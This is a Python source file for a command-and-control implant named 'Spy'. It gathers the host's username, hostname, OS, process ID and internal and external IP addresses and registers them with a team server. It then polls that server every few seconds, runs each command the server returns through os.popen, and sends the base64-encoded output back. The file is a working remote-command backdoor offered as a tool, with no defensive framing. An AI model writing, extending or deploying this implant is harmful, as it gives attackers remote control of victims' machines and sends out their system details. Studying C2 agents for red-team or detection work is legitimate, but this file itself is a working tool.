import requests
from sys import argv
import time
import itertools
import random
import string
import platform
import getpass
import os
import socket
import urllib.request
import argparse
import base64
import aiohttp
import asyncio
import logging
from datetime import datetime  # Assuming you want to use datetime for timestamps

class Spy:
	def __init__(self):
		self.id = None
		self.guid = None
		self.active = False
		self.intaddr = None
		self.extaddr = None
		self.username = None
		self.hostname = None
		self.ops = None
		self.pid = None
		self.mission = None  # Initialize mission
		self.interval = None
		self.jitter = None
		self.firstcheckin = None
		self.lastcheckin = None
		self.output = None

	async def initial_checkin(self, intaddr, extaddr, username, hostname, ops, pid, server):
		self.active = True
		self.intaddr = intaddr
		self.extaddr = extaddr
		self.username = username
		self.hostname = hostname
		self.ops = ops
		self.pid = pid
		data = {
			"active": str(self.active),
			"intaddr": str(self.intaddr),
			"extaddr": str(self.extaddr),
			"username": str(self.username),
			"hostname": str(self.hostname),
			"ops": str(self.ops),
			"pid": self.pid
			}
		async with aiohttp.ClientSession() as session:
			async with session.post(f"{server}/register", json=data) as response:
				response_data = await response.json()
				print(response_data)
				self.id = int(response_data.get('id'))
				self.guid = response_data.get('guid')
				self.active = response_data.get('active')
				self.firstcheckin = response_data.get('firstcheckin')
				self.lastcheckin = response_data.get('lastcheckin')
		return response_data


async def get_env(spy, server):
	ops = platform.system()
	username = getpass.getuser()
	pid = os.getpid()
	hostname = socket.gethostname()
	extaddr = urllib.request.urlopen('https://ident.me').read().decode('utf8')
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(('8.8.8.8', 1))  # connect() for UDP doesn't send packets
	intaddr = s.getsockname()[0]

	await spy.initial_checkin(intaddr, extaddr, username, hostname, ops, pid, server)
	print("[+] Connected to the C2 server")
	print("[+] Spy GUID " + str(spy.guid))

async def check_in(spy, server):
	data = {"id": spy.id, "active": spy.active}
      #  print(123)
       # print(spy.id)
        #print(spy.active)
	async with aiohttp.ClientSession() as session:
		async with session.post(f"{server}/beacon", json=data) as response:
			response_text = await response.text()  # Get the response text
			return await response.json()


async def cmd_shell(command):
    # Execute the command in a separate thread and then read the output
	popen_object = await asyncio.to_thread(os.popen, command)
	output=str(popen_object.read())
	print(output)
	return output

#def cmd_cd():


#def cmd_upload():

#def cmd_ls():


#def cmd_env():


async def main(ip, port):
	server = f"http://{ip}:{port}"
	newspy = Spy()
	await get_env(newspy, server) 
	while True:
		check_in_response = await check_in(newspy, server)
		command = check_in_response.get('command')
		if command:
			result = await cmd_shell(command)
			result_bytes = result.encode("ascii")
			base64_bytes = base64.b64encode(result_bytes)
			output = base64_bytes.decode("ascii")
			print(output)
			async with aiohttp.ClientSession() as session:
				await session.post(f'{server}/result/{newspy.id}', json={"command": command, "result": output})
		await asyncio.sleep(3)

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument('--ip', '-i',required=True,dest='ip',help='Team server IP')
	parser.add_argument('--port', '-p',required=True,dest='port',help='Port of the listener')
	args = parser.parse_args()
	ip = args.ip
	port = args.port
	asyncio.run(main(ip, port))
